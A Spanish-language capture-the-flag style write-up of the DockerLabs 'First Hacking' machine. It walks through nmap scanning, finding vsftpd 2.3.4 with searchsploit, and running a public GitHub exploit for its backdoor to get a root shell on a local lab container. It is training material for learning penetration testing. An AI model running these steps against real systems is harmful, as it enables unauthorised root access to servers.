# Write Up First Hacking

**Dificultad:** Super fácil<br>
**Enlace a dockerlabs:** https://dockerlabs.es/

## Configuración del entorno
Primero de todo desplegamos la máquina mediante el script que viene al descargar la máquina
```
❯ sudo ./auto_deploy.sh firsthacking.tar

Estamos desplegando la máquina vulnerable, espere un momento.

Máquina desplegada, su dirección IP es --> 172.17.0.2

Presiona Ctrl+C cuando termines con la máquina para eliminarla
```

Una vez desplegada, creamos la carpeta firsthacking, nos metemos dentro y usamos la utilidad *mkt* que nos crea las carpetas *nmap*, *content*, *exploits* y *scripts*.

```
❯ mkdir firsthacking-dockerlabs
❯ cd firsthacking-dockerlabs
❯ mkt
❯ ls -l
drwxrwxr-x godack godack 4.0 KB Thu Aug 14 19:20:29 2025 content
drwxrwxr-x godack godack 4.0 KB Thu Aug 14 19:20:29 2025 exploits
drwxrwxr-x godack godack 4.0 KB Thu Aug 14 19:20:29 2025 nmap
drwxrwxr-x godack godack 4.0 KB Thu Aug 14 19:20:29 2025 scripts
```
## Reconocimiento
Lo primero que realizamos es un reconocimiento general con nmap sobre la máquina víctima, para obtener los puertos abiertos. 
```
❯ nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 172.17.0.2 -oG allPorts

PORT   STATE SERVICE REASON
21/tcp open  ftp     syn-ack ttl 64
```

Una vez obtenemos los puertos abiertos, realizamos un escaneo mas exhaustivo mediante scripts de reconocimiento para obtener los servicios de cada puerto y la versión en la que corren

```
❯ extractPorts allPorts
[*] Extracting information...
 
     [*] IP Address: 172.17.0.2
     [*] Open ports: 21
 
[*] Ports copied to clipboard

❯ nmap -sCV -p21 172.17.0.2 -oN targeted
Starting Nmap 7.95 ( https://nmap.org ) at 2025-08-14 19:17 CEST
Nmap scan report for 172.17.0.2
Host is up (0.00018s latency).

PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 2.3.4
MAC Address: 02:42:AC:11:00:02 (Unknown)
Service Info: OS: Unix

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 2.71 seconds
```

De esta manera descubrimos que el servicio que está corriendo en el puerto 21 (puerto FTP) es el vsftpd versión 2.3.4.

## Explotación
Una vez hecho el reconocimiento de puertos y servicios, nos damos cuenta que al buscar con searchsploit el servicio vsftpd con la versión 2.3.4 en searchsploit es un servicio vulnerable.
```
❯ searchsploit vsftpd 2.3.4
-------------------------------------------------------- ---------------------------------
 Exploit Title                                          |  Path
-------------------------------------------------------- ---------------------------------
vsftpd 2.3.4 - Backdoor Command Execution               | unix/remote/49757.py
vsftpd 2.3.4 - Backdoor Command Execution (Metasploit)  | unix/remote/17491.rb
-------------------------------------------------------- ---------------------------------
Shellcodes: No Results
```

De esta manera, buscamos en github exploits para esta vulnerabilidad, y nos encontramos con este repositori, nos lo descargamos y lo ejecutamos (https://github.com/Hellsender01/vsftpd_2.3.4_Exploit).

```
❯ cd exploits
❯ git clone https://github.com/Hellsender01/vsftpd_2.3.4_Exploit.git
❯ cd vsftpd_2.3.4_Exploit
❯ sudo python3 -m pip install pwntools
❯ python3 exploit.py 172.17.0.2
[+] Got Shell!!!
[+] Opening connection to 172.17.0.2 on port 21: Done
[*] Closed connection to 172.17.0.2 port 21
[+] Opening connection to 172.17.0.2 on port 6200: Done
[*] Switching to interactive mode
$ whoami
root
$  
```

Y ya tenemos acceso a la máquina y sin escalada de privilegios porque ya somos el usuario root!!

## Lecciones vistas
1. Escaneos con **nmap**
2. Uso de **searchsploit**
3. Busqueda de exploits en github